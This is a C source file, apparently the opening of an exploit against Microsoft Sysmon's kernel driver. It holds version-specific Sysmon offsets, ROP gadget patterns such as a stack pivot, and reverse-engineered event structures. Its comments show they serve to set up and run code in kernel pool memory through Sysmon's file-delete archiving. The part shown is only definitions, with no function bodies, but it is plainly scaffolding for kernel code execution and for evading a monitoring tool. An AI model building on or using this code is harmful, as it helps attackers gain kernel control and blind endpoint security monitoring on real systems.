#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

#define NonPagedPool 0

//
// Define Sysmon target version.
//
#define V120

#ifdef V110
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F5E0
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FAE0
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x2834
#elif defined(V1110)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F5E0
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FAE0
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x27C5
#elif defined(V1111)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F718
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FC60
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x28A6
#elif defined(V120)
#define SYSMON_ZWOPENPROCESSTOKENEX_OFFSET 0x1F658
#define SYSMON_END_OF_DATA_SECTION_OFFSET 0x21000
#define SYSMON_REPORT_EVENT_LIST_OFFSET 0x1FB60
#define SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET 0x289F
#endif

#define MAX_EVENT_SIZE 40000

 // Console colours.
#define CONSOLE_RED FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_RED FOREGROUND_RED
#define CONSOLE_GREEN FOREGROUND_GREEN | FOREGROUND_INTENSITY
#define CONSOLE_DARK_GREEN FOREGROUND_GREEN
#define CONSOLE_BLUE FOREGROUND_BLUE | FOREGROUND_INTENSITY
#define CONSOLE_DARK_BLUE FOREGROUND_BLUE
#define CONSOLE_CYAN FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY
#define CONSOLE_YELLOW FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_YELLOW FOREGROUND_GREEN | FOREGROUND_RED
#define CONSOLE_PURPLE FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_DARK_PURPLE FOREGROUND_BLUE | FOREGROUND_RED
#define CONSOLE_WHITE FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_INTENSITY
#define CONSOLE_GRAY FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED

typedef enum _DEBUG_LEVEL {
	DEBUG_INFO,
	DEBUG_SUCCESS,
	DEBUG_WARNING,
	DEBUG_ERROR
} DEBUG_LEVEL;

CHAR dbgSym[] = {
	'*',	// DEBUG_INFO.
	'+',	// DEBUG_SUCCESS.
	'!',	// DEBUG_WARNING.
	'-'		// DEBUG_ERROR.
};

WORD dbgColour[] = {
	CONSOLE_WHITE,	// DEBUG_INFO.
	CONSOLE_GREEN,	// DEBUG_SUCCESS.
	CONSOLE_YELLOW,	// DEBUG_WARNING.
	CONSOLE_RED		// DEBUG_ERROR.
};

#define PRINT_INFO(fmt, ...) PrintDebug(DEBUG_INFO, fmt, __VA_ARGS__)
#define PRINT_SUCCESS(fmt, ... ) PrintDebug(DEBUG_SUCCESS, fmt, __VA_ARGS__)
#define PRINT_WARNING(fmt, ...) PrintDebug(DEBUG_WARNING, fmt, __VA_ARGS__)
#define PRINT_ERROR(fmt, ...) PrintDebug(DEBUG_ERROR, fmt, __VA_ARGS__)

#define GET_ROP_GADGET(x) \
	PRINT_INFO("Finding " #x " gadget\n"); \
	PVOID x ## Gadget = FindRopGadget(x ## Pattern, sizeof(x ## Pattern)); \
	if (!x ## Gadget) { \
		PRINT_ERROR("Failed to find " #x " gadget\n"); return FALSE; \
	}

#define GET_NT_PROC(x) \
	PVOID x = GetNtProc(#x); \
	if (!x) { \
		PRINT_ERROR("Failed to find " #x); return FALSE; \
	}

typedef struct _DISPATCHER_HEADER {
	union {
		struct {
			UCHAR Type;
			UCHAR Absolute;
			UCHAR Size;
			union {
				UCHAR Inserted;
				BOOLEAN DebugActive;
			};
		};
		volatile LONG Lock;
	};
	LONG SignalState;
	LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _KEVENT {
	DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;

typedef struct _EVENT_HEADER {
	/*  0 */ ULONG Id;
	/*  4 */ ULONG Size;		// Total struct size.
	/*  8 */ PVOID Unk1;
	/* 10 */ ULONG EventDataSize;
} EVENT_HEADER, * PEVENT_HEADER;

typedef struct _FILE_DELETE_EVENT {
	/*   0 */ EVENT_HEADER EventHeader;
	/*  18 */ HANDLE ProcessHandle;
	/*  20 */ PVOID SystemUtcTime;
	/*  28 */ ULONG HashMethod;
	/*  2C */ BOOLEAN IsExecutable;
	/*  30 */ ULONG SidLength;
	/*  34 */ ULONG ObjectNameLength;
	/*  38 */ ULONG ImageFileNameLength;
	/*  3C */ ULONG HashLength;
	/*  40 */ WCHAR StatusString[256];
	/* 240 */ HANDLE ServiceProcessHandle;
	/* 248 */ PKEVENT Event;
	/* 250 */ PBOOLEAN IsArchivedAddress;
	/* 258 */ // User SID.
	/* xxx */ // Object name.
	/* xxx */ // Image file name.
	/* xxx */ // Hash file name.
} FILE_DELETE_EVENT, * PFILE_DELETE_EVENT;

typedef struct _SET_ARCHIVED_INFO {
	/*  0 */ BYTE IsArchived;
	/*  8 */ HANDLE ServiceProcessHandle;
	/* 10 */ PKEVENT Event;
	/* 18 */ PBYTE IsArchivedAddress;
} SET_ARCHIVED_INFO, * PSET_ARCHIVED_INFO;

typedef struct _ROP_GADGET_PATTERNS {
	PBYTE StackPivot;
	PBYTE PopRax;
	PBYTE MovRdxRax;
	PBYTE PopRdx;
} ROP_GADGET_PATTERNS, *PROP_GADGET_PATTERNS;

typedef struct _EXEC_CONTEXT {
	SET_ARCHIVED_INFO ArchivedInfo1;	// Set up pool for code.
	SET_ARCHIVED_INFO ArchivedInfo2;	// Execute pool code.
	PKEVENT EventBypass;				// Bypass KeSetEvent for fast writing.
} EXEC_CONTEXT, *PEXEC_CONTEXT;

typedef
VOID
WORKER_THREAD_ROUTINE(
	_In_ PVOID Parameter
);

typedef WORKER_THREAD_ROUTINE* PWORKER_THREAD_ROUTINE;

typedef struct _WORK_QUEUE_ITEM {
	LIST_ENTRY List;
	PWORKER_THREAD_ROUTINE WorkerRoutine;
	__volatile PVOID Parameter;
} WORK_QUEUE_ITEM, * PWORK_QUEUE_ITEM;

EXTERN_C
NTSTATUS
NTAPI
NtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
);
